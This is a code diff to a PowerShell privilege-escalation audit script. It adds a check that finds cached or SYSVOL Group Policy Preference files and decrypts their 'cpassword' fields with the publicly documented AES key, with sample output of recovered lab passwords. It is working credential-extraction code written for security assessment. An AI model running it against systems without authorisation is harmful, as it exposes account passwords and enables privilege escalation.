@@ -3564,6 +3564,218 @@ function Invoke-CredentialManagerCheck {
         Write-Verbose ([ComponentModel.Win32Exception] $LastError)
     }
 }
+
+function Invoke-GPPPasswordCheck {
+    <#
+    .SYNOPSIS
+
+    Lists Group Policy Preferences (GPP) containing a non-empty "cpassword" field.
+
+    Author: @itm4n
+    Credit: @obscuresec, @harmj0y
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    Before KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a 
+    custom account. This feature was mainly used to deploy a custom local administrator account on
+    a group of machines. There were two problems with this approach though. First, since the Group 
+    Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second 
+    problem is that the password set in these GPPs is AES256-encrypted with a default key, which 
+    is publicly documented. This means that any authenticated user could potentially access very 
+    sensitive data and elevate their privileges on their machine or even the domain. 
+
+    This function will check whether any locally cached GPP file contains a non-empty "cpassword" 
+    field. If so, it will decrypt it and return a custom PS object containing some information 
+    about the GPP along with the location of the file. 
+    
+    .PARAMETER Remote
+
+    Set this flag if you want to search for GPP files in the SYSVOL share of your primary Domain
+    Controller. 
+    
+    .EXAMPLE
+
+    PS C:\> Invoke-GPPPasswordCheck
+
+    Type     : Mapped Drive
+    UserName : shareuser
+    Password : S3cur3Shar3
+    Content  : Path: \\evilcorp.lab\SecureShare
+    Changed  : 2020-02-09 14:03:57
+    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{3A61470B-FD38-462A-A2E2-FC279A2754AE}\S-1-5-21-2135246055-3766984803-592010092-1103\Preferences\Drives\Drives.xml
+
+    Type     : Data Source
+    UserName : datasource
+    Password : S0urce0fThePr0blem
+    Content  : DSN: source
+    Changed  : 2020-02-09 12:23:43
+    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{3FC99437-7C06-491A-8EBC-786CDA055862}\S-1-5-21-2135246055-3766984803-592010092-1103\Preferences\DataSources\DataSources.xml
+
+    Type     : Service
+    UserName : EVILCORP\SvcControl
+    Password : S3cr3tS3rvic3
+    Content  : Name: CustomService
+    Changed  : 2020-02-09 12:16:18
+    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{66E11622-15A4-40B7-938C-FAD43AF1F572}\Machine\Preferences\Services\Services.xml
+
+    Type     : Scheduled Task
+    UserName : EVILCORP\SvcCustomTask
+    Password : T4skM4ster
+    Content  : App: C:\windows\system32\cmd.exe
+    Changed  : 2020-02-09 12:20:50
+    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{6E9805DA-4CFC-47AC-BFC4-216FED08D39E}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+
+    Type     : User/Group
+    UserName : LocalAdmin
+    Password : $uper$ecureP4ss
+    Content  : Description: Super secure local admin account
+    Changed  : 2020-02-09 12:09:59
+    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{8B95814A-23A2-4FB7-8BBA-53745EA1F11C}\Machine\Preferences\Groups\Groups.xml
+
+    .LINK
+
+    https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+    https://adsecurity.org/?p=2288
+    https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025
+    https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati
+
+    #>
+
+    [CmdletBinding()] param(
+        [switch]$Remote
+    )
+
+    Add-Type -Assembly System.Security
+    Add-Type -Assembly System.Core
+
+    function Get-DecrpytedPassword {
+        [CmdletBinding()] param(
+            [string] $Cpassword 
+        )
+
+        if (-not [String]::IsNullOrEmpty($Cpassword)) {
+
+            $Mod = $Cpassword.Length % 4
+            if ($Mod -gt 0) {
+                $Cpassword += "=" * (4 - $Mod)
+            }
+
+            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+
+            try {
+
+                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+
+                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+                $AesObject.IV = $AesIV
+                $AesObject.Key = $AesKey
+                $DecryptorObject = $AesObject.CreateDecryptor() 
+                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+
+                [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
+
+            } catch [Exception] {
+                Write-Verbose $_.Exception.Message
+            }
+        }
+    }
+
+    if ($Remote) {
+        $GppPath = "\\$($Env:USERDNSDOMAIN)\SYSVOL"
+    } else {
+        $GppPath = $Env:ALLUSERSPROFILE
+        if ($GppPath -notmatch "ProgramData") {
+            $GppPath = Join-Path -Path $GppPath -ChildPath "Application Data"
+        } else {
+            $GppPath = Join-Path -Path $GppPath -ChildPath "Microsoft\Group Policy"
+        }
+    }
+    
+    if (Test-Path -Path $GppPath -ErrorAction SilentlyContinue) {
+
+        $CachedGPPFiles = Get-ChildItem -Path $GppPath -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Drives.xml','Printers.xml' -Force -ErrorAction SilentlyContinue
+
+        foreach ($File in $CachedGPPFiles) {
+            
+            $FileFullPath = $File.FullName 
+            Write-Verbose $FileFullPath
+
+            try {
+                [xml]$XmlFile = Get-Content -Path $FileFullPath -ErrorAction SilentlyContinue
+            } catch [Exception] {
+                Write-Verbose $_.Exception.Message 
+            }
+
+            if ($Null -eq $XmlFile) {
+                continue
+            }
+
+            $XmlFile.GetElementsByTagName("Properties") | ForEach-Object {
+
+                $Properties = $_ 
+                $Cpassword = ""
+
+                switch ($File.BaseName) {
+
+                    Groups {
+                        $Type = "User/Group"
+                        $UserName = $Properties.userName 
+                        $Cpassword = $Properties.cpassword 
+                        $Content = "Description: $($Properties.description)"
+                    }
+    
+                    Scheduledtasks {
+                        $Type = "Scheduled Task"
+                        $UserName = $Properties.runAs 
+                        $Cpassword = $Properties.cpassword 
+                        $Content = "App: $($Properties.appName) $($Properties.args)"
+                    }
+    
+                    DataSources {
+                        $Type = "Data Source"
+                        $UserName = $Properties.username 
+                        $Cpassword = $Properties.cpassword 
+                        $Content = "DSN: $($Properties.dsn)"
+                    }
+    
+                    Drives {
+                        $Type = "Mapped Drive"
+                        $UserName = $Properties.userName 
+                        $Cpassword = $Properties.cpassword 
+                        $Content = "Path: $($Properties.path)"
+                    }
+    
+                    Services {
+                        $Type = "Service"
+                        $UserName = $Properties.accountName 
+                        $Cpassword = $Properties.cpassword 
+                        $Content = "Name: $($Properties.serviceName)"
+                    }
+
+                    Printers {
+                        $Type = "Printer"
+                        $UserName = $Properties.username 
+                        $Cpassword = $Properties.cpassword 
+                        $Content = "Path: $($Properties.path)"
+                    }
+                }
+
+                if (-not [String]::IsNullOrEmpty($Cpassword)) {
+                    $Item = New-Object -TypeName PSObject
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $Type
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $UserName
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $(Get-DecrpytedPassword -Cpassword $Cpassword)
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Content" -Value $Content
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Changed" -Value $Properties.ParentNode.changed
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "FilePath" -Value $FileFullPath
+                    $Item
+                }
+            }
+        }
+    }
+}
 # ----------------------------------------------------------------
 # END CREDENTIALS     
 # ----------------------------------------------------------------
@@ -4760,6 +4972,19 @@ function Invoke-PrivescCheck {
     $Results = Invoke-CredentialManagerCheck
     if ($Results) {
         "[*] Found $(([object[]]$Results).Length) result(s)."
+        $Results | Format-List
+    } else {
+        "[!] Nothing found."
+    }
+
+    "`n"
+
+    "TEST: Checking Cached Group Policy Preferences..."
+    "DESC: Is there any cached GPP containing a 'cpassword'?"
+    "NOTE: It has become very rare but it's still a quick win."
+    $Results = Invoke-GPPPasswordCheck
+    if ($Results) {
+        "[*] Found $(([object[]]$Results).Length) credential(s)."
         $Results | Format-List
     } else {
         "[!] Nothing found."
